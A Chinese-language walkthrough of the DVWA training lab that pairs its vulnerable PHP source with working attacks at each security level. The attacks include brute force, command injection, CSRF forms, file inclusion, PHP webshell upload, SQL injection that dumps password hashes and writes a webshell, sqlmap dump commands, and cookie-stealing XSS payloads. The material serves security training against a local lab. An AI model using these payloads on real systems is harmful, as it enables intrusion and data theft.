# DVWA Writeup

 

复习一些web强身健体（不是  

其中webshell部分的eval被我改成了evaltest，不然windows defender总报...  

## 环境  

[https://github.com/ethicalhack3r/DVWA](https://github.com/ethicalhack3r/DVWA)  

docker启动 `docker run --rm -it -p 80:80 vulnerables/web-dvwa`  

默认凭证: admin/password  

https://www.freebuf.com/articles/web/274058.html  

burp的四种攻击模式：https://blog.csdn.net/huilan_same/article/details/64440284  

## Brute Force  

### low  

```php  
<?php  
  
if( isset( $_GET[ 'Login' ] ) ) {  
    // Get username  
    $user = $_GET[ 'username' ];  
  
    // Get password  
    $pass = $_GET[ 'password' ];  
    $pass = md5( $pass );  
  
    // Check the database  
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );  
  
    if( $result && mysqli_num_rows( $result ) == 1 ) {  
        // Get users details  
        $row    = mysqli_fetch_assoc( $result );  
        $avatar = $row["avatar"];  
  
        // Login successful  
        echo "<p>Welcome to the password protected area {$user}</p>";  
        echo "<img src=\\"{$avatar}\\" />";  
    }  
    else {  
        // Login failed  
        echo "<pre><br />Username and/or password incorrect.</pre>";  
    }  
  
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);  
}  
  
?>  
```

![](/images/dvwa/1.png)  

get请求中的username和password可以直接爆破  

![](/images/dvwa/2.png)  

将请求数据发送到 `Intruder` 模块进行暴力破解，爆破字典使用 Kali 内置的字典`/usr/share/wordlists/fasttrack.txt`,使用 `§` 符号标记需要测试的数据  

![](/images/dvwa/3.png)  

根据返回的数据长度推测爆破成功，即密码为 `password`  

![](/images/dvwa/4.png)  


### medium  

```php  
<?php  
  
if( isset( $_GET[ 'Login' ] ) ) {  
    // Sanitise username input  
    $user = $_GET[ 'username' ];  
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
  
    // Sanitise password input  
    $pass = $_GET[ 'password' ];  
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
    $pass = md5( $pass );  
  
    // Check the database  
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );  
  
    if( $result && mysqli_num_rows( $result ) == 1 ) {  
        // Get users details  
        $row    = mysqli_fetch_assoc( $result );  
        $avatar = $row["avatar"];  
  
        // Login successful  
        echo "<p>Welcome to the password protected area {$user}</p>";  
        echo "<img src=\\"{$avatar}\\" />";  
    }  
    else {  
        // Login failed  
        sleep( 2 );  
        echo "<pre><br />Username and/or password incorrect.</pre>";  
    }  
  
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);  
}  
  
?>  
```

对user和pass进行了过滤，使用了`mysql_real_escape_string`函数，会对字符串中的特殊字符进行转义，防止注入。而且在失败以后添加了sleep函数，爆破会慢一些，但是步骤不变。  

### high  

```php  
<?php  
  
if( isset( $_GET[ 'Login' ] ) ) {  
    // Check Anti-CSRF token  
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );  
  
    // Sanitise username input  
    $user = $_GET[ 'username' ];  
    $user = stripslashes( $user );  
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
  
    // Sanitise password input  
    $pass = $_GET[ 'password' ];  
    $pass = stripslashes( $pass );  
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
    $pass = md5( $pass );  
  
    // Check database  
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );  
  
    if( $result && mysqli_num_rows( $result ) == 1 ) {  
        // Get users details  
        $row    = mysqli_fetch_assoc( $result );  
        $avatar = $row["avatar"];  
  
        // Login successful  
        echo "<p>Welcome to the password protected area {$user}</p>";  
        echo "<img src=\\"{$avatar}\\" />";  
    }  
    else {  
        // Login failed  
        sleep( rand( 0, 3 ) );  
        echo "<pre><br />Username and/or password incorrect.</pre>";  
    }  
  
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);  
}  
  
// Generate Anti-CSRF token  
generateSessionToken();  
  
?>  
```

加入的token来防御CSRF同时增加爆破难度。  

![](/images/dvwa/6.png)  

同样使用 Burp Suite，先将请求数据发送给 `Intruder` 模块，用 `§` 符号标记需要测试的两个数据，一个是 `password`，另一个是 `user_token`，本次使用 `Pitchfork` 攻击方式。  

![](/images/dvwa/7.png)  

在 Option 选项中找到 Grep - Extract，设置从响应中获取 `user_token` ，这里用光标选中想要的内容即可。  

![](/images/dvwa/27.png)  

第一个数据 `password` 仍然使用 Kali 内置的爆破字典 `/usr/share/wordlists/fasttrack.txt`；  

第二个数据 `user_token` 从响应页面中递归获取，起始数据为当前未提交登录的页面的 `user_token`。  

![](/images/dvwa/28.png)

根据响应长度排序可以得到正确的password    


![](/images/dvwa/8.png)  


## Common Injection  

命令注入（Command Injection），对一些函数的参数没有做过滤或过滤不严导致的，可以执行系统或者应用指令（CMD命令或者bash命令）的一种注入攻击手段。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一  

shell 环境中用于拼接命令的符号有以下几个：  

```Text  
& --> 前一条命令在后台运行  
&& --> 当且仅当前一条命令执行成功后执行下一条命令  
|| --> 当且仅当前一条命令执行失败后执行下一条命令  
| --> 将前一条命令的标准输出（stdout）作为下一条命令的输入  
; --> 无论前一条指令是否执行成功，都执行下一条指令  
```

  

### low  

```php  
<?php  
  
if( isset( $_POST[ 'Submit' ]  ) ) {  
    // Get input  
    $target = $_REQUEST[ 'ip' ];  
  
    // Determine OS and execute the ping command.  
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {  
        // Windows  
        $cmd = shell_exec( 'ping  ' . $target );  
    }  
    else {  
        // *nix  
        $cmd = shell_exec( 'ping  -c 4 ' . $target );  
    }  
  
    // Feedback for the end user  
    echo "<pre>{$cmd}</pre>";  
}  
  
?>  
```

没有加任何防护，直接注入命令`127.0.0.1 && whoami`  

![](/images/dvwa/9.png)  


### medium  

```php  
<?php  
  
if( isset( $_POST[ 'Submit' ]  ) ) {  
    // Get input  
    $target = $_REQUEST[ 'ip' ];  
  
    // Set blacklist  
    $substitutions = array(  
        '&&' => '',  
        ';'  => '',  
    );  
  
    // Remove any of the charactars in the array (blacklist).  
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );  
  
    // Determine OS and execute the ping command.  
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {  
        // Windows  
        $cmd = shell_exec( 'ping  ' . $target );  
    }  
    else {  
        // *nix  
        $cmd = shell_exec( 'ping  -c 4 ' . $target );  
    }  
  
    // Feedback for the end user  
    echo "<pre>{$cmd}</pre>";  
}  
  
?>  
```

在 Low 的基础上使用 `str_replace` 过滤符号 `&&` 和 `;`。  

`||` 、 `|` 、`&` 仍然可以使用，此外还可以使用 `&&&` 、 `&;&` 等，过滤后就变为 `&` 、 `&&`，同样可以实现漏洞利用。  

```Text  
# ping a.b.c.d 失败，继续执行 ifconfig  
a.b.c.d||ifconfig  
  
# ifconfig 不接受输入  
127.0.0.1|ifconfig  
  
# ping 127.0.0.1 后台结束后返回  
127.0.0.1&ifconfig  
```

### high  

```php  
<?php  
  
if( isset( $_POST[ 'Submit' ]  ) ) {  
    // Get input  
    $target = trim($_REQUEST[ 'ip' ]);  
  
    // Set blacklist  
    $substitutions = array(  
        '&'  => '',  
        ';'  => '',  
        '| ' => '',  
        '-'  => '',  
        '$'  => '',  
        '('  => '',  
        ')'  => '',  
        '`'  => '',  
        '||' => '',  
    );  
  
    // Remove any of the charactars in the array (blacklist).  
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );  
  
    // Determine OS and execute the ping command.  
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {  
        // Windows  
        $cmd = shell_exec( 'ping  ' . $target );  
    }  
    else {  
        // *nix  
        $cmd = shell_exec( 'ping  -c 4 ' . $target );  
    }  
  
    // Feedback for the end user  
    echo "<pre>{$cmd}</pre>";  
}  
  
?>  
```

使用 `trim` 去除字符串首尾的空白字符，然后又过滤了许多符号，但是没有过滤 `|` ，显然可以利用。  

使用管道符 `|` 即可。  

```  
127.0.0.1|ifconfig  
```

## CSRF  

Cross-site request forgery，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。  

### low  

修改密码的链接：http://localhost/vulnerabilities/csrf/?password_new=132&password_conf=23&Change=Change#  

在源码中只要password_new与password_conf一致即可修改密码。故直接发送上述链接吸引受害者点击即可修改密码。  

### medium  

相比于low添加了如下校验：  

```php  
stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false  
```

即用户的请求头中的Referer字段必须包含了服务器的名字。  

![](/images/dvwa/10.png)  

使用burp对其进行修改  


![](/images/dvwa/12.png)  


### high  

加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。  

http://localhost/vulnerabilities/csrf/?password_new=12&password_conf=12&Change=Change&user_token=14299b179fba1e1934cc198a1a884bdc#  

```php  
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );  
```

这里想要达到攻击目的的话需要获取token。这里只有构造一个攻击页面，将其放置在目标服务器，引诱受害者访问，从而完成CSRF攻击。  

```jsx  
<script type="text/javascript">  
    function attack()  
  {  
   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;  
  document.getElementById("transfer").submit();   
  }  
</script>  
   
<iframe src="<http://192.168.109.136/dvwa/vulnerabilities/csrf>" id="hack" border="0" style="display:none;">  
</iframe>  
   
<body onload="attack()">  
  <form method="GET" id="transfer" action="<http://localhost/vulnerabilities/csrf>">  
   <input type="hidden" name="password_new" value="password">  
    <input type="hidden" name="password_conf" value="password">  
   <input type="hidden" name="user_token" value="">  
  <input type="hidden" name="Change" value="Change">  
   </form>  
</body>  
```

如果把上述页面加入到目标服务器，当受害者点击这个页面，脚本会通过一个看不见的框架访问修改密码的页面获取页面中的token，并向服务器发送修改密码的请求，以完成CSFR攻击。  

因为跨域问题，所以这个攻击代码需要注入到目标服务器中才可能完成攻击，可以利用XSS漏洞协助获取CSRF token。  

## 文件包含  

### **文件包含与漏洞**  

文件包含:  

开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。  

文件包含漏洞:  

开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。  

### **文件包含漏洞用到的函数**  

require:找不到被包含的文件，报错，并且停止运行脚本。  

include:找不到被包含的文件,只会报错，但会继续运行脚本。  

require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。  

include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。  

### **目录遍历与文件包含的区别**  

目录遍历是可以读取web目录以外的其他目录,根源在于对路径访问权限设置不严格，针对本系统。  

文件包含是利用函数来包含web目录以外的文件，分为本地包含和远程包含。  

### **文件包含特征**  

```  
?page=a.php  
?home=b.html  
?file=content  
```

### **检测方法**  

```  
?file=../../../../etc/passwd  
?page=file:///etc/passwd  
?home=main.cgi  
?page=http://www.a.com/1.php  
<http://1.1.1.1/dir/file.txt>  
```

### low  

没有任何过滤，可以进行包含任意文件。  

```  
<http://127.0.0.1/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.php>  
```

### medium  

添加了两个过滤条件：  

```php  
$file = str_replace( array( "http://", "https://" ), "", $file );  
$file = str_replace( array( "../", "..\\"" ), "", $file );  
```

使用 `str_replace` 函数进行过滤是很不安全的，因为可以使用双写绕过。例如，我们包含 `hthttp://tp://xx` 时, `str_replace` 函数只会过滤一个 `http://` ，所以最终还是会包含到 [`http://xx`](http://xx/)  

```  
<http://127.0.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.php>  
```

### high  

添加了如下过滤:  

```php  
// Input validation  
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {  
    // This isn't the page we want!  
    echo "ERROR: File not found!";  
    exit;  
}  
```

fnmatch() 函数根据指定的模式来匹配文件名或字符串。  

对包含的文件名进行了限制，必须为 file* 或者 include.php ，否则会提示Error：File not found。  

可以利用 file 协议进行绕过。  

```php  
<http://127.0.0.1/vulnerabilities/fi/?page=file:///D:\\phpStudy\\PHPTutorial\\WWW\\DVWA1\\vulnerabilities\\fi\\test.txt>  
```

## 文件上传  

文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。  

### low  

没有对文件做任何限制，可以直接上传webshell  

```php  
<?php  
@evaltest($_POST['zxl']);  
?>  
```

将上述内容写入1.php文件进行上传  

![](/images/dvwa/13.png)  


使用中国菜刀连接  

![](/images/dvwa/14.png)  


![](/images/dvwa/15.png)  


### medium  

```php  
// File information  
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];  
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];  
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];  
  
    // Is it an image?  
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&  
        ( $uploaded_size < 100000 ) ) {  
  
        // Can we move the file to the upload folder?  
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {  
            // No  
            echo '<pre>Your image was not uploaded.</pre>';  
        }  
        else {  
            // Yes!  
            echo "<pre>{$target_path} succesfully uploaded!</pre>";  
        }  
    }  
```

对文件类型进行了限制，只接受图片格式的文件。可以用burp进行文件名的修改  

![](/images/dvwa/16.png)  


将这个1.jpg修改成1.php即可，后续步骤相同。  

### high  

```php  
// File information  
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];  
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);  
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];  
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];  
  
    // Is it an image?  
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&  
        ( $uploaded_size < 100000 ) &&  
        getimagesize( $uploaded_tmp ) ) {  
```

直接对文件名进行限制。  

使用edjpgcom.exe工具制作图片马即可。  

## SQL注入  

### low  

```php  
<?php  
  
if( isset( $_REQUEST[ 'Submit' ] ) ) {  
    // Get input  
    $id = $_REQUEST[ 'id' ];  
  
    // Check database  
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );  
  
    // Get results  
    while( $row = mysqli_fetch_assoc( $result ) ) {  
        // Get values  
        $first = $row["first_name"];  
        $last  = $row["last_name"];  
  
        // Feedback for end user  
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";  
    }  
  
    mysqli_close($GLOBALS["___mysqli_ston"]);  
}  
  
?>  
```

没有任何过滤直接手工注入  

```  
# 判断是否为注入  
?id=1' or '1'='1  
?id=1' or '1'='2  
  
# 判断字段长度（2 正常，3 异常）  
?id=1' order by 2 --   
?id=1' order by 3 --  
  
# 确定回显点  
?id=1' union select 111,222 --   
  
# 用户名和数据库名称  
?id=1' union select user(),database() --   
-- output：admin@localhost、dvwa  
  
# 查看当前用户和 mysql 版本  
?id=1' union select current_user(),version() --   
-- output：First name: admin@%、 5.5.47-0ubuntu0.14.04.1  
  
# 爆表名  
?id=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema =database() --   
-- output：guestbook,users  
  
# 爆列名（两种办法，加引号或者十六进制编码）  
?id=1' union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273 --   
?id=1' union select 1,group_concat(column_name) from information_schema.columns where table_name ='users' --   
-- output：user_id,first_name,last_name,user,password,avatar,last_login,failed_login  
  
# 爆字段名  
?id=1' union select group_concat(user_id,first_name,last_name),group_concat(password) from users  --   
?id=1' union select null,concat_ws(char(32,58,32),user,password) from users --   
?id=1' union select user,password from users --   
-- output：admin/5f4dcc3b5aa765d61d8327deb882cf99  
  
# 读文件  
?id=1' union select 1,load_file('//tmp//key') --   
  
# 写文件()  
?id=1' and '1'='2' union select null,'hello' into outfile '/tmp/test01' --  
?id=999' union select null,'hello' into outfile '/tmp/test02' --  
?id=999'  union select null,'<?php @evaltest($_POST["gg"]); ?>' into outfile '/tmp/test03' --    
?id=999' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile '//tmp//test04' --  
```

### medium  

```php  
<?php  
  
if( isset( $_POST[ 'Submit' ] ) ) {  
    // Get input  
    $id = $_POST[ 'id' ];  
  
    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);  
  
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );  
  
    // Get results  
    while( $row = mysqli_fetch_assoc( $result ) ) {  
        // Display values  
        $first = $row["first_name"];  
        $last  = $row["last_name"];  
  
        // Feedback for end user  
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";  
    }  
  
}  
  
// This is used later on in the index.php page  
// Setting it here so we can close the database connection in here like in the rest of the source scripts  
$query  = "SELECT COUNT(*) FROM users;";  
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );  
$number_of_rows = mysqli_fetch_row( $result )[0];  
  
mysqli_close($GLOBALS["___mysqli_ston"]);  
?>  
```

添加了`mysqli_real_escape_string`函数对特殊字符进行转义同时内容来自POST请求。转义的字符有：  

```Text
\\x00  
\\n  
\\r  
\\  
'  
"  
\\x1a  
```

数字型注入，不用使用上述特殊字符，使用`hackbar`进行`post`即可  

```Text
# 判断注入点  
id=1 and 1=1 &Submit=Submit  
id=1 and 1=2 &Submit=Submit  
  
# 爆数据  
id=1 union select user,password from users&Submit=Submit  
```

### high  

```php  
<?php  
  
if( isset( $_SESSION [ 'id' ] ) ) {  
    // Get input  
    $id = $_SESSION[ 'id' ];  
  
    // Check database  
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );  
  
    // Get results  
    while( $row = mysqli_fetch_assoc( $result ) ) {  
        // Get values  
        $first = $row["first_name"];  
        $last  = $row["last_name"];  
  
        // Feedback for end user  
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";  
    }  
  
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);          
}  
  
?>  
```

添加`limit 1`限制输出数量，使用注释可以忽略掉  

MySQL 注释 `#` 或 `--` （空格）其他与low相同  

## SQL盲注  

用sqlmap做sql盲注  

### low  

没做任何防护  

- 判断注入点  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch  
```

![](/images/dvwa/17.png)  

- 获取数据库名称  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch --dbs  
```

- 获取当前连接的数据库  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch --current-db  
```

- 列出数据库中所有用户  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch --users  
```

- 获取当前操作的用户  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch --current-user  
```

- 列出可连接数据库的所有账户-对应的密码哈希  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch --passwords  
```

- 列出数据库中所有的数据表  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch -D dvwa --tables  
```

- 列出数据表中所有字段  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch -D dvwa -T users --columns  
```

- 导出特定数据表中的字段  
  
```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/?id=1&Submit=Submit#>" --cookie="security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch -D dvwa -T users -C "user,password" --dump  
```

![](/images/dvwa/18.png)  


### medium  

`POST` 请求，参数在`POST`请求体中传递。此时，构造SQLMap操作命令，则需要将url和data分成两部分分别填写，同时需要更新cookie信息的取值。  

```bash  
python sqlmap.py -u "<http://localhost/vulnerabilities/sqli_blind/#>" --data="id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch -D dvwa -T users -C "user,password" --dump  
```

### high  

1. High级别的查询数据提交的页面、查询结果显示的页面是分离成了2个不同的窗口分别控制的。即在查询提交窗口提交数据（POST请求）之后，需要到另外一个窗口进行查看结果（GET请求）。若需获取请求体中的Form Data数据，则需要在提交数据的窗口中查看网络请求数据or通过拦截工具获取。  
2. High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：`--second-order="xxxurl"`（设置二阶响应的结果显示页面的url），具体的操作命令可参看==>[SQLMap工具使用选项的操作命令&功能](https://www.jianshu.com/p/fa77f2ed788b)  

```bash  
python sqlmap.py --url="<http://localhost/vulnerabilities/sqli_blind/cookie-input.php>" --data="id=1&Submit=Submit" --second-url="<http://localhost/vulnerabilities/sqli_blind/>" --cookie="id=1; security=high; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4" --batch  
```

## weak session ids  

low: 使用+1的规则生成session  

medium: 直接使用时间戳生成session  

high: 使用md5计算session  

上述三种都可以用`Hackbar`和`burp`来完成session预测  

impossible使用随机数+时间戳+固定字符串（"Impossible"）进行 sha1 运算，作为 session Id。  

## XSS(DOM)  

### DOM树  

HTML 文档的主干是标签（tag）。  

根据文档对象模型（DOM），每个 HTML 标签都是一个对象。嵌套的标签是闭合标签的“子标签（children）”。标签内的文本也是一个对象。  

所有这些对象都可以通过 JavaScript 来访问，我们可以使用它们来修改页面。  

例如，`document.body` 是表示 `<body>` 标签的对象。  

HTML DOM 是关于如何获取、修改、添加或删除 HTML 元素的标准  

简单来说DOM主要研究的是`节点`，所有节点可通过javascript访问(增，删，改，查)  

对于DOM型的XSS是一种基于DOM树的一种代码注入攻击方式，可以是反射型的，也可以是存储型的  

最大的特点就是*不与后台服务器交互，只是通过浏览器的DOM树解析产生*  

可能触发DOM型XSS属性：  

```  
document.write属性  
document.referer属性  
innerHTML属性  
windows.name属性  
location属性  
```

### low  

没有任何防护  

```bash  
if (document.location.href.indexOf("default=") >= 0) {  
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8); # 函数截取url中指定参数后面的内容  
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>"); # 将HTML表达式或JavaScript代码  
						document.write("<option value='' disabled='disabled'>----</option>");  
					}  
					      
					document.write("<option value='English'>English</option>");  
					document.write("<option value='French'>French</option>");  
					document.write("<option value='Spanish'>Spanish</option>");  
					document.write("<option value='German'>German</option>");  
```

将标签写成如下形式：  

```bash  
<http://localhost/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(document.cookie)%3C/script%3E>  
```

即可完成弹框。  

### medium  

```php  
<?php  
  
// Is there any input?  
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {  
    $default = $_GET['default'];  
      
    # Do not allow script tags  
    if (stripos ($default, "<script") !== false) {  
        header ("location: ?default=English");  
        exit;  
    }  
}  
  
?>  
```

不允许`<script>`标签。可以选择其他标签：`<img src=1 onerror=alert(1)>`  

但是直接写在default后面解析会有问题:  

![](/images/dvwa/19.png)  

`<option>`标签里面没有值了。可以选择先闭合option标签，再闭合select标签。  

```html  
</option></select><img src=1 onerror=alert(document.cookie)>  
```

或者直接闭合select  

```html  
</select><img src=1 onerror=alert(document.cookie)>  
```

### high  

```php  
<?php  
  
// Is there any input?  
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {  
  
    # White list the allowable languages  
    switch ($_GET['default']) {  
        case "French":  
        case "English":  
        case "German":  
        case "Spanish":  
            # ok  
            break;  
        default:  
            header ("location: ?default=English");  
            exit;  
    }  
}  
  
?>  
```

URL中`#`号之后的内容，不会被提交到服务器，可以直接与浏览器进行交互  

在正常url后输入：`#<script>alert(document.cookie)</script>`即可。  

## XSS Reflect  

### low  

没做过滤`<script>alert(1)</script>`  

![](/images/dvwa/20.png)  


### medium  

```php  
<?php  
  
header ("X-XSS-Protection: 0");  
  
// Is there any input?  
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {  
    // Get input  
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );  
  
    // Feedback for end user  
    echo "<pre>Hello ${name}</pre>";  
}  
  
?>  
```

对`<script>`进行了过滤，有三种绕过方式  

1. 使用双写绕过，`<scr<script>ipt>alert(1)</script>`  
2. 使用大小写绕过`sCript>alert(1)</script>`  
3. 使用其他标签。`<img src=1 onerror=alert(1)>`  

### high  

```php  
<?php  
  
header ("X-XSS-Protection: 0");  
  
// Is there any input?  
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {  
    // Get input  
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );  
  
    // Feedback for end user  
    echo "<pre>Hello ${name}</pre>";  
}  
  
?>  
```

正则匹配绕过`<script>`，可以用img标签。  

## XSS Stored  

### low  

```php  
<?php  
  
if( isset( $_POST[ 'btnSign' ] ) ) {  
    // Get input  
    $message = trim( $_POST[ 'mtxMessage' ] );  
    $name    = trim( $_POST[ 'txtName' ] );  
  
    // Sanitize message input  
    $message = stripslashes( $message );  
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
  
